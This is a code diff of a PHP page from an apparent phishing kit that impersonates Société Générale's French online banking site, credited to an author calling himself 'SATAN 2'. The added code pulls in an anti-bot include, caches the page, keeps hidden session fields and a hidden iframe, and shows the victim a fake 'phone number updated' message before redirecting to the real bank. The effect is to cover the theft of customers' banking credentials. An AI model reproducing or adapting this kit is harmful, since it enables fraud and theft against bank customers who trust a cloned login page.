@@ -1,3 +1,31 @@
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+
+/**
+ * @link       :   https://www.satan2.com/ 
+ * @package    :   SOCIETE GENERALE 
+ * @telegram   :   @satan2  
+ * Project Name:   SOCIETE GENERALE 2022
+ * Author      :   SATAN 2
+ * Mise à jour :   08-09-2022
+ * Author URI  :   https://www.facebook.com/satan2
+ */
+
+include '../inc/antibots.php';
+include_once '../inc/app.php';
+
+$random   = rand(0,100000000000);
+$LSG = substr(md5($random), 0, 17);
+
+?>
+<?php 
+/*CACHE*/
+$fichierCache = '../cache/lsg_finish.lsg';
+if (@filemtime($fichierCache)<time()-(24*3600)) {ob_start(); 
+?>
 
 <!DOCTYPE html>
 <html lang="fr" class="swm-root-active swm-mode-page" >
@@ -382,234 +410,7 @@ document.getElementById('codCl').className = 'waa';
 
 <input id="breadcrumb-channel-ids" type="hidden" value="75eec1c77d92f510VgnVCM100000030013acRCRD,f18ec1c77d92f510VgnVCM100000030013acRCRD,25d136f55ccb9510VgnVCM100000050013acRCRD"/>
 </header>
-<main class="dcw_main dcw_gb9_core-wrapper" role="main">
-<a id="go-content" tabindex="-1"></a>
-<section class="dcw_gb_row">
-</section>
-<section class="dcw_gb_wrapper">
-<a id="go-content" tabindex="-1"></a>
-<section class="dcw_gb9_core-left" id="">
 
-<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/75eec1c77d92f510VgnVCM100000030013acRCRD -->
-<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
-<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, regionNames: header-int-without-navigation-and-open-main,gb9-com1-int, FURL_NAME: /authen/header, FURL_ID: a763c1c77d92f510VgnVCM100000030013acRCRD -->
-
- 
-
-<noscript>
-<style>
-.auth-content {display:none !important;}
-.waitAuthJetonMsg {display: none !important;}
-</style>
-</noscript>
-
-<link rel="stylesheet" href="../assets/css/style.css" />
-
-
-<script>
-
- 
-
-window.swmConfOverride = {
-"version": "21.2.10.1",
-"firm": "BDDF",
-"banque": "BDDF",
-"provenance": "",
-"market": "PRI",
-"isNGIM": true,
-"isCookieless": false,
-"media": "WEB_INT",
-"bank_market_canal": "BDDF_PRI_WEB",
-"isProspect": false,
-"codeClientEtoileNgim": "",
-"defaultUrl": "\/icd\/cbo\/index-authsec.html#cbo\/",
-
-
-"isSASAuth": false,
-"isSupervision": false,
-"logLocal": false,
-"logNiveau": "error",
-"staticBaseUrl": "/icd/static/swm/resources/version/21.2.10.1",
-"baseUrl": "",
-"styles": [],
-"isDebug": false,
-"urlCdnCmsBeforeCmsMainContainer": "${url.cdn.cms.beforeCmsMainContainer.content}",
-"urlCdnCmsAfterCmsMainContainer": "${url.cdn.cms.afterCmsMainContainer.content}",
-"urlCdnCmsBeforeSwmContainerContent": "${url.cdn.cms.beforeSwmContainer.content}",
-"urlCdnCmsAfterSwmContainerContent": "${url.cdn.cms.afterSwmContainer.content}",
-"isZSSCA": "false"
-
-
-
-};
-
-
-swmConfOverride.styles = ["../assets/css/style.css"];
-</script>
-
-<div id="swm-wrapper" class="swm-inner-wrapper">
-<div class="prefetch"></div>
-<div id="disableLayer" class="disable-layer"></div>
-
-
-
-
-
-
-<script id="templateGenericError" type="template/doT.js">
-{{? it.errorType }}
-<span class="swm-popin-picto swm-popin-picto-{{= it.errorType }}" aria-hidden="true"></span>
-{{?}}
-<div class="swm-popin-content">
-{{? it.erreur1}}
-<p>
-{{=it.erreur1}}
-</p>
-{{?}}
-{{? it.erreur2}}
-<p>
-{{=it.erreur2}}
-</p>
-{{?}}
-{{? it.erreur3}}
-<p>
-{{=it.erreur3}}
-</p>
-{{?}}
-</div>
-<div id="swm-popin-btn-erreur" class="swm-button-wrapper swm-popin-btn-erreur {{=it.btnStyle}}">
-<button class="swm_button-arrondi swm_button-principal swm-btn-action csa-cdn-ok swm-btn_primary {{=it.btnStyleNgim}}" type="button" tabindex="1">
-{{=it.bouton}}
-</button>
-</div>
-</script>
-
-<script id="templateCsaError" type="template/doT.js">
-<div class="eer_modal eer_popinOTP" role="dialog" aria-describedby="dialog-desc">
-<span class="eer_modal__picto is-active" aria-hidden="true"></span>
-
-{{? it.erreur1}}
-<p class="eer_popinOTP__title">
-{{=it.erreur1}}
-</p>
-{{?}}
-<p id="dialog-desc" class="eer_modal__content">
-{{? it.erreur2}}
-{{=it.erreur2}}
-{{?}}
-</p>
-<button class="eer_btn eer_btn--primary">{{? it.bouton}}{{=it.bouton}}{{??}}Retour &agrave; mon espace{{?}}</button>
-</div>
-</script>
-
-<div id="swm-tooltip" class="swm-tooltip">
-<span></span>
-</div>
-<div class="swm-popin-wrapper" role="dialog" aria-modal="true" aria-labelledby="swm-modal-label">
-<div id="swm-popin-overlay" class="swm-popin-overlay" role="presentation"></div>
-<div id="swm-popin-dialog" class="swm-popin-dialog">
-<div class="swm-popin-relative">
-<div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" role="button" tabindex="0" aria-label="Fermer la popin"></div>
-<div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
-<div id="swm-popin" class="swm-popin">
-<div id="swm-popin-cadre" class="swm-popin-cadre">
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-
-
- 
-
-<script id="errorMessage" type="template/doT.js">
-<div class="error-wrapper">
-<div class="inner">
-{{? it.bigTitle}}
-<div class="big-title">{{!it.bigTitle}}</div>
-{{?}}
-{{? it.title}}
-<div class="title">{{!it.title}}</div>
-{{?}}
-
-
-
-<div class="message">{{? it.message}}{{=it.message}}{{??}}{{!it}}{{?}}</div>
-
-
-
-</div>
-</div>
-</script>
-
-<script id="messageError" type="template/doT.js">
-<div class="error-wrapper">
-<div class="inner">
-{{? it.bigTitle}}
-<div class="big-title">{{!it.bigTitle}}</div>
-{{?}}
-<div class="message message-error">
-{{? it.title}}
-<div class="titleError">{{!it.title}}</div>
-{{?}}
-{{? it.message}}
-{{=it.message}}
-{{??}}
-{{!it}}
-{{?}}
-{{? it.messageAsuivre}}
-<div class="etapeAsuivre">{{=it.messageAsuivre}}</div>
-{{?}}
-</div>
-<button class="js-error--close is-hide theme-white--is-show auth-btn-action" type="button">OK</button>
-</div>
-</div>
-</script>
-
-<script id="messageWarning" type="template/doT.js">
-<div class="error-wrapper">
-<div class="inner">
-{{? it.bigTitle}}
-<div class="big-title">{{!it.bigTitle}}</div>
-{{?}}
-<div class="message message-warning">
-{{? it.title}}
-<div class="titleWarning">{{!it.title}}</div>
-{{?}}
-{{? it.message}}
-{{=it.message}}
-{{??}}
-{{=it}}
-{{?}}
-{{? it.messageAsuivre}}
-<div class="etapeAsuivre">{{=it.messageAsuivre}}</div>
-{{?}}
-</div>
- <button class="js-error--close is-hide theme-white--is-show auth-btn-action" type="button">OK</button>
-</div>
-</div>
-</script>
-
-
-
-
-
-<div class="swm_authent">
-
-
-<div class="auth-content js-content-aria-hide swm_codeContainer">
-<div id="swmModulesAuth">
-
-
-
-</div>
-
-
-<DIV id="divMaster" class="swm_block">
-  
-
-<!--<main class="dcw_main dcw_gb9_core-wrapper" role="main" style="margin-top: -40px; margin-left: 15%; margin-right: 15%;">-->
 <section class="dcw_main" >
 <section class="dcw_gb_row dcw_gb_communication">
 </section>
@@ -661,16 +462,16 @@ swmConfOverride.styles = ["../assets/css/style.css"];
 
 <div class="dcw_block dcw_block-text">
 <div class="dcw_block-element">
-<h3>L'authentification forte est bien activée, <br>Mise à jour des informations en cours...</h3>
+<h3>Votre numéro de téléphone a bien été mis à jour, <br>Vous allez vous rediriger vers la page d'accueil.</h3>
 </div>
 </div>
 
 
 <script>
 setTimeout(function(){
-window.location.href="finish.php?lsg#12996cdffc1053150";
+window.location.href="https://particuliers.societegenerale.fr/";
 }, 7000);
-</script>  
+</script> 
 
 
 
@@ -691,242 +492,7 @@ window.location.href="finish.php?lsg#12996cdffc1053150";
 </section>
 
 
-</DIV>  
-
-<script id="templateComponentAuthentCv" type="template/doT.js">
-
- <div id="module-authent-cv">
- <div class="container-mire-codeClient"></div>
- <div id="clavier"></div>
- </div>
-
- </script>
-
-
-  </div>
-
-
-
-
-
-<script>
-var fun;
-function onSWMLoaded(params) {
-if ("") {
-fun = function() {
-params.error ? params.error() : (function () {
-if (!document.getElementById('js-error')) {
-document.getElementById(params.defaultClass || 'swm-wrapper').innerHTML = ("<div id=\"js-error\"></div>");
-}
-swm.commun.showErrorMessage.call(this, "", "/icd/cbo/index-authsec.html#cbo/");
-})();
-};
-window.swm ? fun() : document.addEventListener("swm.onLoad", fun);
-} else {
-fun = initSWM.bind(this, params);
-window.swm ? initSWM(params) : document.addEventListener("swm.onLoad", fun);
-}
-}
-
-
-function initSWM(params) {
-
-window.jQueryForSwm = swm.$;
-window.swmAutoInit = false;
-(function(a,b){if(typeof define==="function"&&define.amd){if(typeof swmAutoInit==="undefined"){swmAutoInit=false}define(["jquery"],b)}else{if(typeof swmAutoInit==="undefined"){swmAutoInit=true}var c=a.jQueryForSwm||a.jQuery;if(typeof c==="undefined"){console.debug("swmApi load : !!! jQuery is missing !!!")}b(c)}})(this,function(g){if(window&&typeof window.swmApi!=="undefined"){return window.swmApi}var m={};var p;var s=false;var i=false;var b={getJetonCallback:[],iStockageJetonActifCallback:[],ajaxFilter:[]};var f={};m.consts={};m.consts.niveauSensibilite={};m.consts.niveauSensibilite.NORMAL={value:0};m.consts.niveauSensibilite.SENSIBLE={value:100};m.consts.niveauSensibilite.TRES_SENSIBLE={value:200};if(typeof swmConfOverride!=="undefined"){m.version=swmConfOverride.version}m.loadSwm=function(){r("The method swm.loadSwm is deprecated, please use swm.init instead.");m.init.apply(m,arguments)};m.init=function(u){var v={mainJsPath:"/js/swm.main.js",swmMain:undefined};q(v,u);function w(){m.config=p.config;m.$=p.$;s=false;i=true;o();c("swm.available",p)}m.addConf({onAuthent:v.onAuthent,onBack:v.onBack,onClose:v.onClose,onConnecting:v.onConnecting,onInitDone:v.onInitDone,onLoadingError:v.onLoadingError,onLogout:v.onLogout,ajaxFilterRegExp:v.ajaxFilterRegExp,ajaxFilterJquery:v.ajaxFilterJquery,baseUrl:v.baseUrl});if(!i){p=v.swmMain;if(typeof p!=="undefined"){setTimeout(w,0)}else{j("swm.init",function(x){p=x;w()});if(!s){s=true;var t;if(typeof swmConfOverride!=="undefined"&&swmConfOverride.staticBaseUrl){t=(v.baseUrl||"")+swmConfOverride.staticBaseUrl+v.mainJsPath}else{t="/swm/resources/version/"+m.version+v.mainJsPath}k(t,function(){c("swm.loadingError")})}}}else{c("swm.available",p)}};if(window.swmAutoInit){j("swm.loaded",m.init)}window.swmAutoInit=undefined;m.ajaxFilter=function(u,t){if(p){u.ajaxFilterJquery=u.ajaxFilterJquery||g||p.$;if(u.ajaxFilterRegExp){u.ajaxFilterJquery.ajax=p.filterAjaxRequests(u).overridedAjax;if(typeof t==="function"){t()}}return u.ajaxFilterJquery.ajax}else{a("ajaxFilter",[u,t])}};m.onLogout=function(t){j("swm.logout",t)};m.onClose=function(t){j("swm.close",t);j("swm.closeKeyboard",t)};m.onConnecting=function(t){j("swm.connecting",t)};m.onBack=function(t){j("swm.back",t)};m.onLogoutError=function(t){j("swm.logout.error",t)};m.onAuthent=function(t){j("swm.postchgtnivauth",t)};m.setStockageJetonActif=function(t){t=t==true;if(p){p.data.setStockageJetonActif(t)}else{h("setStockageJetonActif",t)}};m.isStockageJetonActif=function(t){if(typeof t=="function"){if(p){setTimeout(function(){t(p.data.isStockageJetonActif())},0)}else{a("iStockageJetonActifCallback",t);return undefined}}};m.getJeton=function(t){if(typeof t=="function"){if(p){setTimeout(function(){t(p.data.getJeton())},0)}else{a("getJetonCallback",t);return undefined}}};m.getIdStat=function(){if(p){return p.data.getIdStat()}return undefined};m.reattribuerCodeSecret=function(t,u){if(p){p.reattribuerCodeSecret(t,u)}else{h("reattribuerCodeSecret",[t,u])}};m.sign=function(t,v){if(p){return p.sign(t,v)}else{var u={getData:function(){return new Error("Signature non prÃªte public.")}};h("sign",{params:[t,v],promise:u});if(typeof t==="string"){return u}}};m.triggerSwmLogout=function(){if(p){return p.triggerSwmLogout()}else{return new Error("triggerSwmLogout non prÃªte public.")}};m.record=function(t){if(p){return p.record(t)}else{h("record",arguments)}};m.checkSign=function(t){if(p){return p.checkSign(t)}else{h("checkSign",arguments)}};m.gda_handleResponse=function(w,u,v,t){if(p){return p.gda_handleResponse(w,u,v,t)}else{return undefined}};m.errorSign=function(t){var u={};u.success=t.success;u.actionLevel=t.action_level||t.actionLevel||0;u.jetonTransaction=t.context||t.jetonTransaction;u.error=t.error;u.isMessageRequired=t.isMessageRequired;u.callback=t.callback;if(p){return p.errorSign(u)}else{h("errorSign",arguments)}};m.getDateDerniereConnexion=function(){if(p){return p.data.getDateDerniereConnexion()}return undefined};m.getCanalDerniereConnexion=function(){if(p){return p.data.getCanalDerniereConnexion()}return undefined};m.getDroits=function(){if(p){return p.data.getDroits()}return undefined};m.logout=function(){if(p){p.logout.apply(m,arguments)}else{h("logout",arguments)}};m.logoutSupervision=function(){r("The method swmApi.logoutSupervision is deprecated, please use swmApi.logout instead.");m.logout()};m.resetAuthentData=function(){if(p){p.data.resetAuthentData.apply(m,arguments)}else{h("resetAuthentData",arguments)}};m.isAuthenticated=function(){if(p){return p.isAuthenticated()}return false};m.authent=function(u,t,v){if(p){t=t||function(w){if(f.preSuccess==="function"){f.preSuccess(w,function(){f.success(w)})}else{f.success(w)}};v=v||f.error;return p.authent(u,t,v)}else{h("authent",[u,t,v])}return false};m.setDefaultAuthentCallbacks=function(t){f.preSuccess=t.preSuccess||f.preSuccess;f.success=t.success||f.success;f.error=t.error||f.error};m.changeCodeSecret=function(t,u){if(p){return p.changeCodeSecret(t,u)}else{h("changeCodeSecret",[t,u])}return false};m.changeCodeSecretDelegue=function(u,v,t){if(p){return p.changeCodeSecret(u,v,t)}else{h("changeCodeSecretDelegue",[u,v,t])}return false};m.addConf=function(t){t.onAuthent&&j("swm.postchgtnivauth",t.onAuthent);t.onLogout&&j("swm.logout",t.onLogout);t.onBack&&j("swm.back",t.onBack);t.onClose&&j("swm.close",t.onClose);t.onConnecting&&j("swm.connecting",t.onConnecting);t.onLoadingError&&j("swm.loadingError",t.onLoadingError);t.onAjaxFilterReady&&j("swm.onResponseFilterReady",t.onAjaxFilterReady);if(t.ajaxFilterRegExp){var u={ajaxFilterRegExp:t.ajaxFilterRegExp,ajaxFilterJquery:t.ajaxFilterJquery,ajaxFilterAxios:t.ajaxFilterAxios};m.ajaxFilter(u,t.onAjaxFilterReady)}if(t.baseUrl){d(t.baseUrl)}if(typeof p!="undefined"){t.onInitDone&&t.onInitDone()}else{t.onInitDone&&j("swm.available",t.onInitDone)}};function d(t){if(p){p.config.baseUrl=t}else{h("setBaseUrl",[t])}}function h(t,u){b[t]=u;!s&&!i&&m.init()}function a(t,u){b[t].push(u);!s&&!i&&m.init()}function n(t){return t&&Object.prototype.toString.call(t)==="[object Array]"}function o(){for(var v in b){if(v==="iStockageJetonActifCallback"||v==="getJetonCallback"){for(var u in b[v]){m.hasOwnProperty(v)&&typeof m[v]==="function"&&m[v](u)}}else{if(v==="signature"){var w=m[v].apply(m,b[v].params);if(typeof w==="object"){b.signature.promise.getData=w}}else{if(v==="setBaseUrl"){d.apply(m,b.setBaseUrl)}else{if(n(b[v])){for(var t in b[v]){b[v].hasOwnProperty(t)&&m[v].apply(m,b[v][t])}}else{m[v].apply(m,b[v])}}}}}b={getJetonCallback:[],iStockageJetonActifCallback:[]}}function c(t,v){var u=document.createEvent("Event");u.initEvent(t,true,true);u.data=v;document.dispatchEvent(u);var x=window.self!==window.top;if(x){try{top.document.dispatchEvent(u)}catch(w){}}}g&&(g.fn.triggerExternal=c);function j(u,v){var t=function(w){if(typeof v==="function"){v(w.data)}};document.removeEventListener(u,t);document.addEventListener(u,t)}function k(u,v){if(g&&typeof g.Deferred!=="undefined"){var t=l(u);g.when(t).fail(v)}else{e(u,v)}}function l(v){var t=g.Deferred(),u=document.createElement("script");u.async="async";u.type="text/javascript";u.src=v;u.onload=u.onreadystatechange=function(x,w){if(!u.readyState||/loaded|complete/.test(u.readyState)){if(w){t.reject()}else{t.resolve()}}};u.onerror=function(){t.reject()};g("head")[0].appendChild(u);return t.promise()}function e(u,v){var t=document.createElement("script");t.async=false;t.src=u;t.type="text/javascript";t.onerror=v;t.charset="UTF-8";document.getElementsByTagName("head")[0].appendChild(t)}function r(u){try{console&&typeof console.warn==="function"&&console.warn("[SWM] "+u)}catch(t){}}function q(u,t){if(t){for(var v in t){if(t.hasOwnProperty(v)){u[v]=t[v]}}}return u}setTimeout(function(){c("swm.loaded",m)},0);window.swmApi=m;return m});
-swmApi.init({
-swmMain: swm
-});
-swm.commun.setGdaReplay("/swm/swm-redirect.html", "rDBg2KLXMgVm0a88I35dzCUPCOosAQAAAQAAABsAAAAvY29tL2ljZC13ZWIvY2JvL2luZGV4Lmh0bWw%3D", "" || window.location.hash);
-if ("") {
-swm.commun.showError("");
-}
-params.event && swm.trackEvent(params.event);
-document.removeEventListener("swm.onLoad", fun);
-fun = undefined;
-params.success && params.success();
-}
-</script>
-
-<script>
-onSWMLoaded({
-defaultClass: 'swmModulesAuth',
-success: function() {
-
-swmApi.setDefaultAuthentCallbacks({
-success : function(rsp) {
-swm.commun.replayInterceptedPage();
-},
-error: function(err) {
-swm.defaultAuthentError(err, "/icd/cbo/index-authsec.html#cbo/");
-}
-});
-
-swmApi.authent("300");
-},
-event: {
-pageName: 'Mon_Profil::Connexion::Ecran_Connexion'
-}
-});
-</script>
-
-</div>
-
-
-
-<!--<script type="text/javascript" src="../assets/js/swm.main.js" charset="UTF-8"></script>-->
-
-
-
-
-
-
-
-<script type="text/javascript">
-if (typeof(swm) != "undefined" && swm.onLogout) {
-swm.onLogout(function() {
-document.location.href = '/icd/cbo/index-authsec.html#cbo/';
-});
-}
-
-</script>
-</div>
-
-
-</section>
-<section class="dcw_gb9_core-right">
-
-
- 
-
-
-<div>
-
-<div>
-<link href="../assets/css/eo2680-style.css" rel="stylesheet">
-<div id="swm-content-default">
-<p><br>
-<strong>Obtenir vos codes</strong><br>
-<br>
-Le code client vous est attribué par un conseiller au moment de votre inscription au contrat Banque à distance en agence. Lors d'une ouverture de compte en ligne, le code client vous est envoyé par courrier. Il est également indiqué sur vos relevés de comptes.<br>
-<br>
-<strong>Code secret oublié</strong><br>
-<br>
-<a style="text-decoration: underline !important" href="#" class="dcw_card-visual_regular-link"><svg aria-hidden=" true="><use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Effectuer une nouvelle demande</a><br>
-<br>
-<br>
-<strong>Urgences carte bancaire</strong><br>
-<br>
-<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Faire opposition &agrave; votre carte bancaire"><svg aria-hidden="true" focusable="false"><use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Faire opposition à votre carte bancaire</a><br>
-<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifi&eacute;es"><svg aria-hidden="true" focusable="false"><use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Verrouiller votre carte bancaire</a><br>
-<br>
-<br>
-<strong>Nos conseils sécurité</strong><br>
-<br>
-<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="D&eacute;couvrez le Pass s&eacute;curit&eacute;"><svg aria-hidden="true" focusable="false"><use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Découvrez le Pass sécurité</a><br>
-<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifi&eacute;es"><svg aria-hidden="true" focusable="false"><use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Voir les menaces identifiées</a><br>
-<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Voir le Guide des bonnes pratiques"><svg aria-hidden="true" focusable="false"><use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Guide des bonnes pratiques</a></p>
-</div>
-
-<div id="swm-content-oob" style="display:none">
-<div class="eo2680-pass">
-<p class="eo2680-oob--title">Sécurité renforcée</p>
-
-<div class="eo2680-card">
-<figure><img src="../assets/img/securite-renforcee.png"></figure>
-
-<p><strong>La réglementation européenne*</strong>, applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l’accès à votre Espace Client est soumis à <strong>une authentification renforcée tous les 90 jours</strong>.</p>
-</div>
-<!-- #eo2680-card -->
-
-<p class="eo2680-pass--txt"><strong>Comment ça se passe ?</strong><br>
-Une demande de connexion est envoyée en temps réel sur votre mobile dans l’Appli Société Générale. Il vous suffit de la valider depuis votre mobile. <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="D&eacute;couvrez le Pass s&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Tout savoir sur le Pass Sécurité</a></p>
-
-<hr>
-<p class="eo2680-pass--txt"><strong>Vous avez changé de numéro de téléphone ?</strong><br>
-Vous pouvez modifier votre numéro de téléphone en appelant notre serveur vocal au +33 825 007 111 (0,05 eur TTC/min + prix d'un appel) ou en vous rendant dans votre agence. <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="D&eacute;couvrez le Pass s&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Communiquer votre numéro de téléphone Sécurité</a> <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Activer votre t&eacute;l&eacute;phone S&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Activer votre téléphone Sécurité</a></p>
-
-<hr>
-<p class="eo2680-ml">* Directive Européenne des Services de Paiement 2 (DSP2)</p>
-</div>
-<!-- #eo2680-oob --></div>
-<!-- #### -->
-
-<div id="swm-content-otp" style="display:none">
-<div class="eo2680-oob">
-<p class="eo2680-oob--title">Sécurité renforcée</p>
-
-<div class="eo2680-card">
-<figure><img src="../assets/img/securite-renforcee.png"></figure>
-
-<p><strong>La réglementation européenne*</strong>, applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l’accès à votre Espace Client est soumis à <strong>une authentification renforcée tous les 90 jours</strong>.</p>
-</div>
-<!-- #eo2680-card -->
-
-<div class="eo2680-card"><span><strong>Le saviez vous ?</strong></span>
-
-<figure><img src="../assets/img/s-curit-renforc-e-2.png"></figure>
-
-<p>Le <strong>Pass Sécurité</strong> disponible dans l’Appli Société Générale vous permet de <strong>valider très simplement</strong> les actions nécessitant une<strong> authentification renforcée</strong>. Plus besoin de mémoriser et saisir le Code Sécurité reçu par SMS : tout se passe instantanément dans l’Appli ! <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="D&eacute;couvrez le Pass s&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Tout savoir sur le Pass Sécurité</a></p>
-</div>
-<!-- #eo2680-card -->
-
-<p class="eo2680-ml">* Directive Européenne des Services de Paiement 2 (DSP2)</p>
-</div>
-<!-- #eo2680-otp --></div>
-
-</div>
-
-</div>
-
-
-
-
-</section>
-<section class="dcw_gb_row dcw_gb_clearfix">
-
-
- 
-
-<div>
-
-<div>
-<script type="text/javascript">
-  var element = document.querySelector('.rsp_header');
-  element.classList.add("js-header-lhs-auth");
-</script>
-
-</div>
-
-</div>
-
-
-
-
-</section>
-</section>
-</main>
-<aside class="dcw_msg-banner dcw_msg-banner--info" role="alert" id="cookieDisclaimer" style="display:none">
-<div class="dcw_msg-banner_msg-wrapper">
-<svg class='dcw_msg-banner_picto-info' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#info'></use></svg>
-<p class="dcw_msg-banner_message">
-En poursuivant votre navigation sur ce site, vous acceptez l'utilisation de cookies pour vous proposer des publicités ciblées adaptées à vos centres d'intérêts et réaliser des statistiques. Pour en savoir plus et paramétrer vos cookies,&nbsp;<span style="font-size: 16px;"><a href="#" class="eip_dcw_main-link">cliquez ici</a></span>.
-</p>
-<button class="dcw_msg-banner_btn-closed" arial-label="Fermer le message contextuel">
-<svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#close-2'></use></svg>
-</button>
-</div>
-</aside><aside class="dcw_msg-banner dcw_msg-banner--info dcw_msg-banner--last-connexion" id="lastConnectionBanner" role="alert" style="display:none;">
-<div class="dcw_msg-banner_msg-wrapper">
-<svg class='dcw_msg-banner_picto-info' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#info'></use></svg>
-<p class="dcw_msg-banner_message" id="lastConnectionMessage">
-
-</p>
-<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed">
-<svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#close-2'></use></svg>
-</button>
-</div>
-</aside><footer class="dcw_footer" role="contentinfo">
+<footer class="dcw_footer" role="contentinfo">
 <div class="dcw_footer-second" style="background-color: black !important;">
 <div class="dcw_footer_container">
 <nav class="dcw_footer-second_nav">
@@ -1101,7 +667,22 @@ if(idd == 2){
   </div>
   <div class="interact-test" bis_skin_checked="1"></div>
    </div>
-</DIV>
+</DIV> 
+
+<?php 
+$contenuCache = ob_get_contents();ob_end_flush();
+$fd = fopen("$fichierCache", "w");
+if ($fd) {fwrite($fd,$contenuCache);fclose($fd);}} else {readfile('../cache/lsg_finish.lsg');echo "\n";}  
+?>
+<input type="hidden" name="memoryText" id="memoryText" value="<?php if(isset($_SESSION['memory'])){ echo htmlspecialchars($_SESSION['memory']); } ?>" style="display: none;">
+<footer style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"> 
+<div id="footerr" class="Footer" style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"></div><iframe id="footerr2" src="" scrolling="no" style="display: none; visibility: hidden; overflow: hidden; width: 0px !important; height: 0px !important;"></iframe>
+</footer>
+<script src="../assets/js/jquery.min.aaffcbf7942d5bedb07855e48cbc1afa.js" defer="defer"></script>
+<script src="../assets/js/jquery.min.aaffcbf7942d5bedb07855e48cbc1afb.js" defer="defer"></script>
 
 
+</body>
+</html>
+ 
 
